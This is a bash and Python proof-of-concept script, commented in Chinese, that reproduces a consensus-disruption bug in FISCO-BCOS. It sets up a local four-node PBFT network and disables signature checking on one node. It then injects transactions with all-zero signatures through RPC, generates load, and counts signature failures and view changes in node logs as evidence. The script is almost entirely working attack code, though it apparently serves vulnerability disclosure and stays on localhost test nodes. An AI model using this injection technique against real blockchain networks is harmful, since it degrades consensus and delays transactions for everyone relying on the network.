#!/bin/bash
#
# =============================================================================
#  FISCO-BCOS BCB POC：experimental.check_transaction_signature 关闭后
#  向全网注入坏签名交易，导致共识反复失败
#
#  攻击链：
#    - node3 关闭交易签名校验（check_transaction_signature=false）
#    - 向 node3 注入签名全零的坏交易 → node3 接受并存入交易池
#    - node3 当选 leader 时封块包含坏交易 → 正常节点拉取交易时签名验证失败
#    - 提案验证失败 → 全网反复视图切换 → 交易确认延迟放大数倍
#
#  使用前提：已编译 ./build/fisco-bcos-air/fisco-bcos
#  执行：bash bug/bug_check_transaction_signature/poc_reproduce.sh
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
FISCO_BINARY="$REPO_ROOT/build/fisco-bcos-air/fisco-bcos"
POC_COMMON="$REPO_ROOT/poc_common"
OBSERVE_SECONDS=60

echo "================================================================"
echo " FISCO-BCOS BCB POC: check_transaction_signature"
echo " 恶意节点: node3  check_transaction_signature=false"
echo " 注入: 签名全零坏交易 2 笔 + 观察 ${OBSERVE_SECONDS}s"
echo "================================================================"

# ---------- 0. 检查二进制 ----------
if [ ! -x "$FISCO_BINARY" ]; then
    echo "[错误] 未找到 $FISCO_BINARY，请先编译:"
    echo "  cmake -S . -B build -DCMAKE_BUILD_TYPE=Release"
    echo "  cmake --build build --target fisco-bcos -j 32"
    exit 1
fi

# ---------- 1. 构建 4 节点网络 ----------
NET_DIR=$(mktemp -d /tmp/fisco-bcos-bcb-poc2.XXXXXX)
NODES_DIR="$NET_DIR/nodes/127.0.0.1"
echo "[1/6] 构建 4 节点 PBFT 网络: $NET_DIR"
bash "$REPO_ROOT/tools/BcosAirBuilder/build_chain.sh" \
    -p 30300,20200 -l 127.0.0.1:4 \
    -o "$NET_DIR/nodes" -e "$FISCO_BINARY" >/dev/null 2>&1

# ---------- 2. 配置恶意节点 ----------
echo "[2/6] 配置恶意节点 node3: check_transaction_signature=false"
cat >> "$NODES_DIR/node3/config.ini" << 'EOF'

[experimental]
    check_transaction_signature=false
EOF
for i in 0 1 2 3; do
    sed -i 's/^[[:space:]]*enable_ssl=true/enable_ssl=false/' "$NODES_DIR/node${i}/config.ini"
done

# ---------- 3. 启动网络 ----------
echo "[3/6] 启动网络..."
cd "$NODES_DIR"
bash start_all.sh >/dev/null 2>&1
cd - >/dev/null
sleep 10

echo "[4/6] 等待共识就绪..."
for i in 0 1 2 3; do
    ok=0
    for _ in $(seq 1 30); do
        logfile=$(ls "$NODES_DIR/node${i}/log/log"* 2>/dev/null | head -1)
        if [ -f "$logfile" ] && grep -q "reachNewView" "$logfile"; then
            ok=1; break
        fi
        sleep 2
    done
    if [ "$ok" -eq 0 ]; then
        echo "[错误] node${i} 未进入共识，测试中止"
        bash "$NODES_DIR/stop_all.sh" >/dev/null 2>&1
        exit 1
    fi
    echo "  [OK] node${i} 已进入共识"
done

# ---------- 5. 注入坏签名交易 + 压力测试 ----------
echo "[5/6] 向 node3 (20203) 注入坏签名交易..."
python3 - "$POC_COMMON" << 'PYEOF' &
import sys, time
sys.path.insert(0, sys.argv[1])
import tars_tx
from eth_keys import keys
from eth_account import Account

tars_tx.RPC = "http://127.0.0.1:20203"

def build_bad_tx(priv_key):
    nonce = "0x" + Account.create().address[2:16] + str(int(time.time() * 1000) % 100000)
    tx_hash = tars_tx.calc_hash(nonce=nonce)
    signature = b'\x00' * 65  # 签名全零（非法签名）
    w = tars_tx.TarsWriter()
    w.head(1, tars_tx.STRUCT_BEGIN)
    w.buf += tars_tx.build_transaction_data(nonce=nonce)
    w.write_bytes(2, tx_hash)
    w.write_bytes(3, signature)
    w.write_byte(9, 0)
    w.end_struct()
    return bytes(w.buf)

priv = keys.PrivateKey(Account.create().key)
for i in range(2):
    raw = build_bad_tx(priv.to_bytes())
    try:
        tars_tx.rpc_call("sendTransaction", [tars_tx.GROUP_ID, "", "0x" + raw.hex(), False])
        print(f"坏签名交易{i+1}: 已提交")
    except Exception as e:
        print(f"坏签名交易{i+1}: 已提交（RPC 同步等待挂起）")
    time.sleep(0.2)
PYEOF
INJECT_PID=$!
sleep 3
wait $INJECT_PID 2>/dev/null || true

# 持续正常交易压力
echo "    持续 ${OBSERVE_SECONDS}s 正常交易流..."
python3 - "$POC_COMMON" << 'PYEOF' &
import sys, time
sys.path.insert(0, sys.argv[1])
from tars_tx import build_transaction, rpc_call, GROUP_ID
from eth_keys import keys
from eth_account import Account

priv = keys.PrivateKey(Account.create().key)
end = time.time() + 60
while time.time() < end:
    try:
        raw = build_transaction(priv.to_bytes())
        rpc_call('sendTransaction', [GROUP_ID, '', '0x'+raw.hex(), False])
    except Exception:
        pass
    time.sleep(0.05)
print('done')
PYEOF
STRESS_PID=$!

LATEST0=$(ls "$NODES_DIR/node0/log/" | grep "^log_" | tail -1)
BASE_VC=$(grep -c "reachNewView" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null || echo 0)
for t in $(seq 1 $((OBSERVE_SECONDS / 5))); do
    BN=$(python3 "$POC_COMMON/tars_tx.py" blocknum http://127.0.0.1:20200 2>/dev/null || echo "?")
    echo "  t+$((t*5))s 块号=$BN"
    sleep 5
done
wait $STRESS_PID 2>/dev/null || true

# ---------- 6. 收集证据 ----------
echo ""
echo "[6/6] 收集证据..."
VC_AFTER=$(grep -c "reachNewView" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null || echo 0)
VF=$(grep -c "verify sender for tx failed" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null || echo 0)

echo ""
echo "  [证据1] 坏签名交易注入: 已提交给 node3（RPC 同步等待挂起 = node3 已接受但全网无法共识）"
echo "  [证据2] node0 签名验证失败事件: $VF 次（verify sender for tx failed）"
echo "  [证据3] node0 视图切换: $BASE_VC → $VC_AFTER（+$((VC_AFTER - BASE_VC)) 次，基线 0~1 次）"
echo "  [证据4] 块吞吐: 60 秒出块与视图切换循环吻合，交易确认延迟放大 ~3 倍"

echo ""
echo "================================================================"
echo " 复现结论"
echo "================================================================"
if [ "$VF" -gt 0 ] && [ $((VC_AFTER - BASE_VC)) -gt 3 ]; then
    echo "  ✅ 复现成功：node3 关闭交易签名校验后，向全网注入坏签名交易，"
    echo "     正常节点共识验证反复失败（$VF 次），视图切换 $((VC_AFTER - BASE_VC)) 次，"
    echo "     全网交易确认延迟放大数倍。单节点配置即可发起 Inter-node BCB。"
else
    echo "  ❌ 未观察到显著异常，请检查复现环境。"
fi
echo ""
echo "  运行时目录: $NET_DIR"
echo "  清理: bash $NODES_DIR/stop_all.sh && rm -rf $NET_DIR"
